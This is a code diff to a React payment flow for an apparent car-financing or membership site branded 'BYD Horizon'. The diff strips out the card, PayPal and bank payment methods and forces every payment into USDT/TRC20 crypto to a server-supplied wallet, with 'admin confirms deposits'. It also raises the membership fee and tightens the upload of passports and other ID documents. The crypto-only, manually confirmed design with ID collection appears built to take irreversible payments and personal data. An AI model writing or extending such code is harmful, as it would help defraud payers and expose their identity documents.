@@ -57,11 +57,7 @@ const CAR_MODELS: CarModel[] = [
 ];
 
 const PAYMENT_METHODS: PaymentMethod[] = [
-  { id: 'crypto', name: 'Cryptocurrency (USDT/TRC20)', icon: 'bitcoin', badgeColor: 'emerald', badgeText: 'Fastest (0-5 min)', description: 'Pay with USDT on TRC20 network' },
-  { id: 'paystack', name: 'Paystack', icon: 'creditcard', badgeColor: 'yellow', badgeText: 'Available (1-3 days)', description: 'Card payments via Paystack' },
-  { id: 'stripe', name: 'Stripe', icon: 'creditcard', badgeColor: 'yellow', badgeText: '1-3 days', description: 'International card payments' },
-  { id: 'paypal', name: 'PayPal', icon: 'wallet', badgeColor: 'yellow', badgeText: '1-3 days', description: 'Pay with your PayPal balance' },
-  { id: 'bank', name: 'Bank Transfer', icon: 'banknote', badgeColor: 'gray', badgeText: '3-5 days', description: 'Direct bank transfer' },
+  { id: 'crypto', name: 'Cryptocurrency (USDT/TRC20)', icon: 'bitcoin', badgeColor: 'emerald', badgeText: 'Only Active Method', description: 'Pay with USDT on TRC20 network — admin confirms deposits' },
 ];
 
 const ID_TYPES = ['Passport', "Driver's License", 'National ID', 'Voter ID'];
@@ -146,7 +142,7 @@ const CheckmarkAnimation: React.FC = () => {
 };
 
 const apiPost = async (url: string, body: any) => {
-  const token = localStorage.getItem('token');
+  const token = localStorage.getItem('byd_horizon_token') || localStorage.getItem('token');
   const res = await fetch(url, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', ...(token ? { Authorization: `Bearer ${token}` } : {}) },
@@ -189,16 +185,17 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
 
   const selectedCarModel = CAR_MODELS.find(c => c.id === form.carModel) || CAR_MODELS[0];
   const monthlyPayment = selectedCarModel ? (selectedCarModel.price / form.installmentTerm) * 0.85 : 0;
-  const cryptoAmount = form.plan === 'founders-club' ? '99' : String(Math.round(monthlyPayment));
+  const cryptoAmount = form.plan === 'founders-club' ? '150' : String(Math.round(monthlyPayment));
 
   const updateForm = (field: keyof FormData, value: any) => setForm(prev => ({ ...prev, [field]: value }));
 
   useEffect(() => {
     if (step === 'crypto-payment') {
-      fetch('/api/admin/wallets', { headers: { 'Content-Type': 'application/json' } })
+      const token = localStorage.getItem('byd_horizon_token') || localStorage.getItem('token');
+      fetch('/api/payments/wallet', { headers: { 'Content-Type': 'application/json', ...(token ? { Authorization: `Bearer ${token}` } : {}) } })
         .then(r => r.json())
         .then(data => {
-          if (data.global_wallet) updateForm('walletAddress', data.global_wallet);
+          if (data.wallet_address) updateForm('walletAddress', data.wallet_address);
         })
         .catch(() => {});
     }
@@ -235,7 +232,8 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
     try {
       const res = await apiPost('/api/auth/login', { email: form.email, password: form.password });
       if (res.error) { setError(res.error); return; }
-      localStorage.setItem('token', res.token);
+      localStorage.setItem('byd_horizon_token', res.token);
+      localStorage.setItem('byd_horizon_user', JSON.stringify(res.user || {}));
       onLoginSuccess(res.token, res.user);
       setStepWithIndex('plans', 1);
     } catch { setError('Invalid email or password.'); }
@@ -261,13 +259,11 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
   };
 
   const handleSelectPaymentMethod = (methodId: string) => {
-    switch (methodId) {
-      case 'crypto': setStep('crypto-payment'); break;
-      case 'paystack': setStep('paystack-flow'); setPaystackStage('card'); break;
-      case 'stripe': setStep('stripe-flow'); setProcessingTimeout(false); break;
-      case 'paypal': setStep('paypal-flow'); setProcessingTimeout(false); break;
-      case 'bank': setStep('bank-transfer'); break;
+    // Crypto is the ONLY active payment method — route everything else to crypto.
+    if (methodId !== 'crypto') {
+      setError('Only crypto (USDT/BTC/ETH) is accepted. Redirecting to crypto payment.');
     }
+    setStep('crypto-payment');
   };
 
   const handleCryptoPayment = async () => {
@@ -285,7 +281,7 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
   };
 
   const copyWallet = () => {
-    navigator.clipboard.writeText('TR7U3kP9x2mZnQ8vL5jM1wX4yR6sN0bA');
+    navigator.clipboard.writeText(form.walletAddress || 'TR7U3kP9x2mZnQ8vL5jM1wX4yR6sN0bA');
     setCryptoWalletCopied(true);
     setTimeout(() => setCryptoWalletCopied(false), 2000);
   };
@@ -350,7 +346,14 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
         if (v instanceof File) formData.append(entry[0], v);
         else if (typeof v === "string") formData.append(entry[0], v);
       });
-      await fetch('/api/kyc/submit', { method: 'POST', body: formData });
+      const token = localStorage.getItem('byd_horizon_token') || localStorage.getItem('token');
+      const res = await fetch('/api/kyc/submit', {
+        method: 'POST',
+        headers: { ...(token ? { Authorization: `Bearer ${token}` } : {}) },
+        body: formData
+      });
+      const json = await res.json();
+      if (json.error) { setError(json.error); return; }
       setStep('success');
       setShowConfetti(true);
       setTimeout(() => setShowConfetti(false), 5000);
@@ -473,7 +476,7 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
               <p className="text-white/40 text-sm">Annual membership</p>
             </div>
             <div className="text-right">
-              <p className="text-3xl font-bold text-emerald-400">$99</p>
+              <p className="text-3xl font-bold text-emerald-400">$150</p>
               <p className="text-white/30 text-xs">/year</p>
             </div>
           </div>
@@ -531,7 +534,7 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
       <div className="text-center">
         <h2 className="text-2xl font-bold text-white">Payment Method</h2>
         <p className="text-white/50 text-sm mt-1">
-          Amount: <span className="text-emerald-400 font-bold">${form.plan === 'founders-club' ? '99' : Math.round(monthlyPayment).toLocaleString()}</span>
+          Amount: <span className="text-emerald-400 font-bold">${form.plan === 'founders-club' ? '150' : Math.round(monthlyPayment).toLocaleString()}</span>
         </p>
       </div>
       {cryptoBonus && (
@@ -589,7 +592,7 @@ const PaymentFlow: React.FC<PaymentFlowProps> = ({ initialPlan, onNavigate, onLo
         <div className="space-y-2">
           <label className="text-sm text-white/50">Deposit Address (TRC20)</label>
           <div className="flex items-center gap-2 p-3 bg-black/30 border border-white/10 rounded-xl">
-            <code className="flex-1 text-xs sm:text-sm text-emerald-300 font-mono break-all">TR7U3kP9x2mZnQ8vL5jM1wX4yR6sN0bA</code>
+            <code className="flex-1 text-xs sm:text-sm text-emerald-300 font-mono break-all">{form.walletAddress || "TR7U3kP9x2mZnQ8vL5jM1wX4yR6sN0bA"}</code>
             <button onClick={copyWallet} className="flex-shrink-0 p-2 bg-white/5 hover:bg-white/10 rounded-lg transition-all" title="Copy address">
               {cryptoWalletCopied ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-white/60" />}
             </button>
